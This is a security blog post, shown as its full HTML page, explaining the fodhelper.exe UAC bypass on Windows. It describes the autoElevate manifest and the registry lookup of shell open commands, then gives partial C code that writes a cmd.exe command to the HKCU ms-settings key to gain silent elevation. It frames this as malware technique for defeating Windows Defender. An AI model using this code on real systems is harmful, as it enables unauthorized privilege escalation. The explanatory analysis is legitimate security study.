<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="UAC bypass using fodhelper" />
<meta property="og:locale" content="en" />
<meta name="description" content="User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves fodhelper.exe. This post will explore how fodhelper.exe can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender." />
<meta property="og:description" content="User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves fodhelper.exe. This post will explore how fodhelper.exe can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender." />
<link rel="canonical" href="http://localhost:4000/posts/UAC_bypass_using_fodhelper/" />
<meta property="og:url" content="http://localhost:4000/posts/UAC_bypass_using_fodhelper/" />
<meta property="og:site_name" content="Utsab Adhikari" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-21T15:34:00+05:45" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UAC bypass using fodhelper" />
<meta name="twitter:site" content="@twitter_username" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-08-22T22:02:00+05:45","datePublished":"2024-08-21T15:34:00+05:45","description":"User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves fodhelper.exe. This post will explore how fodhelper.exe can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender.","headline":"UAC bypass using fodhelper","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/UAC_bypass_using_fodhelper/"},"url":"http://localhost:4000/posts/UAC_bypass_using_fodhelper/"}</script>
<!-- End Jekyll SEO tag -->


  <title>UAC bypass using fodhelper | Utsab Adhikari
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Utsab Adhikari">
<meta name="application-name" content="Utsab Adhikari">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      let self = this;this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          self.clearMode();
        }
        self.notify();
      });

      if (!this.hasMode) {
        return;
      }

      if (this.isDarkMode) {
        this.setDark();
      } else {
        this.setLight();
      }
    }

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isPreferDark() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }get modeStatus() {
      if (this.hasMode) {
        return this.mode;
      } else {
        return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        this.clearMode();
      } else {
        if (this.isPreferDark) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    }
  }

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"></a>

    <h1 class="site-title">
      <a href="/">Utsab Adhikari</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">A Site for my blog posts.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/FOLDSAB"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/twitter_username"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['adhikariutshav999','hotmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>UAC bypass using fodhelper</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>UAC bypass using fodhelper</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1724233740"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 21, 2024
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1724343420"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 22, 2024
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/username">Utsab Adhikari</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1239 words"
>
  <em>6 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <p>User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves <code class="language-plaintext highlighter-rouge">fodhelper.exe</code>. This post will explore how <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender.</p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/example-uac-prompt.webp" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/example-uac-prompt.webp" alt="UAC" loading="lazy"></a></p>

<p>Before diving into how <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> can be exploited. it’s important to know how basics of this exploitation works.</p>

<h2 id="fodhelperexe"><span class="me-2">fodhelper.exe</span><a href="#fodhelperexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><code class="language-plaintext highlighter-rouge">fodhelper.exe</code> was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It’s located at C:\Windows\System32\fodhelper.exe in the System32 directory. This file is digitally signed by Microsoft, ensuring its authenticity and integrity.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>c:\windows\system32\fodhelper.exe:
    Verified:       Signed
    Signing date:   4:21 AM 7/4/2024
    Publisher:      Microsoft Windows
    Company:        Microsoft Corporation
    Description:    Features On Demand Helper
    Product:        Microsoft® Windows® Operating System
    Prod version:   10.0.22621.3672
    File version:   10.0.22621.3672 (WinBuild.160101.0800)
    MachineType:    64-bit
    Binary Version: 10.0.22621.3672
    Original Name:  FodHelper.EXE
    Internal Name:  FodHelper
    Copyright:      © Microsoft Corporation. All rights reserved.
    Comments:       n/a
    Entropy:        5.558
    Manifest:
<span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="c">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span>
<span class="nt">&lt;assembly</span>
   <span class="na">xmlns=</span><span class="s">"urn:schemas-microsoft-com:asm.v1"</span>
   <span class="na">xmlns:asmv3=</span><span class="s">"urn:schemas-microsoft-com:asm.v3"</span>
   <span class="na">manifestVersion=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;assemblyIdentity</span> <span class="na">type=</span><span class="s">"win32"</span> <span class="na">publicKeyToken=</span><span class="s">"6595b64144ccf1df"</span> <span class="na">name=</span><span class="s">"Microsoft.Windows.FodHelper"</span> <span class="na">version=</span><span class="s">"5.1.0.0"</span> <span class="na">processorArchitecture=</span><span class="s">"amd64"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;description&gt;</span>Features On Demand Helper UI<span class="nt">&lt;/description&gt;</span>
 <span class="nt">&lt;trustInfo</span> <span class="na">xmlns=</span><span class="s">"urn:schemas-microsoft-com:asm.v3"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;security&gt;</span>
      <span class="nt">&lt;requestedPrivileges&gt;</span>
          <span class="nt">&lt;requestedExecutionLevel</span>
            <span class="na">level=</span><span class="s">"requireAdministrator"</span>
          <span class="nt">/&gt;</span>
      <span class="nt">&lt;/requestedPrivileges&gt;</span>
  <span class="nt">&lt;/security&gt;</span>
 <span class="nt">&lt;/trustInfo&gt;</span>
 <span class="nt">&lt;asmv3:application&gt;</span>
    <span class="nt">&lt;asmv3:windowsSettings</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;dpiAware&gt;</span>true<span class="nt">&lt;/dpiAware&gt;</span>
        <span class="nt">&lt;autoElevate&gt;</span>true<span class="nt">&lt;/autoElevate&gt;</span>
    <span class="nt">&lt;/asmv3:windowsSettings&gt;</span>
 <span class="nt">&lt;/asmv3:application&gt;</span>
<span class="nt">&lt;/assembly&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">fodhelper.exe</code> is designed to automatically run with elevated privileges because it has the <code class="language-plaintext highlighter-rouge">autoelevate</code> flag set. This allows it to upgrade its integrity level from Medium to High without requiring a UAC prompt. The <code class="language-plaintext highlighter-rouge">sigcheck</code> tool shows that the application is intended for administrative users and requires full admin rights. The <code class="language-plaintext highlighter-rouge">autoelevate</code> feature enables it to achieve these higher privileges without requesting admin approval.</p>

<h2 id="understanding-the-exploitation"><span class="me-2">Understanding the exploitation</span><a href="#understanding-the-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Running <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> and capturing its events with ProcMon shows that it attemps to query a default value for the registry key <code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command</code>. Additionally, it checks for the <code class="language-plaintext highlighter-rouge">DelegateExecute</code> value in the same registry path (<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command</code>).</p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/fodhelperprocmon.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/fodhelperprocmon.png" alt="fodhelperprocmon" loading="lazy"></a></p>

<h3 id="understanding-file-execution-through-the-windows-registry"><span class="me-2">Understanding File Execution Through the Windows Registry</span><a href="#understanding-file-execution-through-the-windows-registry" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>To clearly understand the exploitation, it’s important to examine how file execution works. For better clarity, let’s use the example of an <code class="language-plaintext highlighter-rouge">.html</code> file.</p>

<p>When a file is double-clicked in Windows, the system determines which application should open it based on the file’s extension (like <code class="language-plaintext highlighter-rouge">.html</code>, <code class="language-plaintext highlighter-rouge">.txt</code>, etc.). The information linking file extensions to their respective applications is stored in the Windows Registry, specifically under <code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT</code>.</p>

<ul>
  <li>Suppose an <code class="language-plaintext highlighter-rouge">.html</code> file is opened; the system checks for the <code class="language-plaintext highlighter-rouge">.html</code> extension under the <code class="language-plaintext highlighter-rouge">.html</code> key in <code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT</code> to look for it’s <a href="https://learn.microsoft.com/en-us/windows/win32/shell/fa-progids"><code class="language-plaintext highlighter-rouge">ProgID</code></a>.</li>
</ul>

<p><strong>ProgID:</strong> A Programmatic ID (ProgID) is a string that uniquely identifies a specific version of a COM class, which can be an application or a component. For file associations, a ProgID links a file extension to the application or component that should handle it. The correct structure of a ProgID key name follows the format <code class="language-plaintext highlighter-rouge">[Vendor or Application].[Component].[Version]</code>, using periods to separate each part, with no spaces in between. An example would be <code class="language-plaintext highlighter-rouge">Word.Document.6</code>.</p>

<p>For an HTML file, the ProgID is <code class="language-plaintext highlighter-rouge">htmlfile</code>, which is outlined in red in the screenshot below.</p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/ProgID.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/ProgID.png" alt="progID" loading="lazy"></a></p>

<ul>
  <li>Once the ProgID (<code class="language-plaintext highlighter-rouge">htmlfile</code>) is identified, Windows searches for the corresponding ProgID key under <code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT</code>.</li>
</ul>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/ProgIDishtmlfile.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/ProgIDishtmlfile.png" alt="searchingProgID" loading="lazy"></a></p>

<ul>
  <li>
    <p>Under the ProgID key (<code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT\htmlfile</code>),There is typically a <code class="language-plaintext highlighter-rouge">shell</code> subkey that defines actions such as open, edit, and more.</p>
  </li>
  <li>
    <p>The <code class="language-plaintext highlighter-rouge">open</code> action usually has a <code class="language-plaintext highlighter-rouge">command</code> subkey that specifies the command line used to open the file. This command often points to the executable of the preferred web browser for html file</p>
  </li>
</ul>

<!-- *Note:* The `shell\open\command` key is queried by ``fodhelper.exe``.
 -->

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">command</code> subkey might have a value like</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s">"C:\Program Files\Internet Explorer\iexplore.exe"</span> <span class="s">"%1"</span> 
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/Command.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/Command.png" alt="command" loading="lazy"></a></p>

<ul>
  <li>Here, <code class="language-plaintext highlighter-rouge">%1</code> is a placeholder for the file path. So, when <code class="language-plaintext highlighter-rouge">.html</code> file is opened, the system will run below command  and the HTML file opens in the browser.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s">"C:\Program Files\Internet Explorer\iexplore.exe"</span> <span class="s">"C:\path</span><span class="se">\t</span><span class="s">o\example.html"</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="case-for-fodhelperexe"><span class="me-2">Case for fodhelper.exe</span><a href="#case-for-fodhelperexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In the case of <code class="language-plaintext highlighter-rouge">fodhelper.exe</code>, the system queries <code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command</code>. This is because settings under <code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes</code> are specific to the currently logged-in user and can override the system-wide settings. For instance, if a user has set <code class="language-plaintext highlighter-rouge">.html</code> files to open with a different browser, this preference is saved in this registry path. As a result, system checks this location to see if the user has any custom commands for opening <code class="language-plaintext highlighter-rouge">exe</code> files. This allows <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> to execute commands with elevated privileges based on user-specific configurations.</p>

<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Now that the exploitation process is understood, let’s take a look at how it is represented in code.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre> <span class="c1">// Registry path to be created</span>
    <span class="n">LPWSTR</span> <span class="n">subkey</span> <span class="o">=</span> <span class="s">L"Software</span><span class="se">\\</span><span class="s">Classes</span><span class="se">\\</span><span class="s">ms-settings</span><span class="se">\\</span><span class="s">Shell</span><span class="se">\\</span><span class="s">Open</span><span class="se">\\</span><span class="s">command"</span><span class="p">;</span>
    <span class="n">HKEY</span> <span class="n">phkresult</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwDisposition</span><span class="p">;</span>

    <span class="c1">// Create the specified registry key</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">RegCreateKeyExW</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span> <span class="n">subkey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">REG_OPTION_NON_VOLATILE</span><span class="p">,</span> <span class="n">KEY_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phkresult</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDisposition</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"RegCreateKeyExW failed with error code %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"The disposition is %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwDisposition</span><span class="p">);</span>

  
    <span class="n">LPSTR</span> <span class="n">valueName</span> <span class="o">=</span> <span class="s">"DelegateExecute"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">values</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="s">"cmd.exe"</span><span class="p">;</span>

    <span class="c1">// Set the value for the default key</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">phkresult</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">values</span><span class="p">,</span> <span class="n">lstrlenA</span><span class="p">(</span><span class="n">values</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"RegSetValueExA failed with error code %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">phkresult</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

